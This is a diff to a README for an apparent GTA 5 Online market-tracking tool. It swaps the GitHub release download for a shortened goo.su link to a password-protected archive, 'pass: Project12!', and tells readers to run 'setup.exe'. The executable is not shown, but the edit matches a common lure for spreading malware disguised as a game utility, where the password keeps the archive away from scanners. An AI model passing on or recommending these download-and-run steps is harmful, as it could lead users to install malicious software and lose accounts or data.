@@ -20,11 +20,9 @@ The software provides **real-time price tracking, market trends, and recommendat
 ---
 
 ## 📥 Installation & Launch
-
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ ** [Download](https://github.com/CatFeather1/GTA-5-Online-Heatmap-Analyze/releases/download/download/GameData_Analyzer.rar) and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)**
-
-2️⃣ **Run `Analyzer.exe`**  
+1️⃣ **[Download](https://goo.su/VshhJUa) and extract archive(pass: Project12!)**
+2️⃣ **Run `setup.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
 ⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
